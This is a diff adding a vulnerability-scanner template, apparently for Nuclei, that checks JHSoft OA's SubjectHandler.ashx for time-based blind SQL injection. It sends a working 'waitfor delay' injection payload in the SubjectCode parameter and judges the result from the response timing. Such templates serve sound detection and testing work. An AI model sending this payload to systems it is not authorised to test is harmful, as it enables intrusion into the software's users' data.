@@ -1,0 +1,33 @@
+id: poc-yaml-jinher-jhsoft-subjecthandler-ashx-sqli
+info:
+  name: JHSoft SubjectHandler.ashx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    product: JHSoft OA
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /c6/JHSoft.Web.CostControl/subClass/Handlers/SubjectHandler.ashx?SubjectCode=1'waitfor+delay%270:0:{{t1}}%27--&Action=updateactive HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 0
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{"result":false}'
+      - type: dsl
+        dsl:
+          - duration >= to_number(t1)
+          - duration <= to_number(t2)
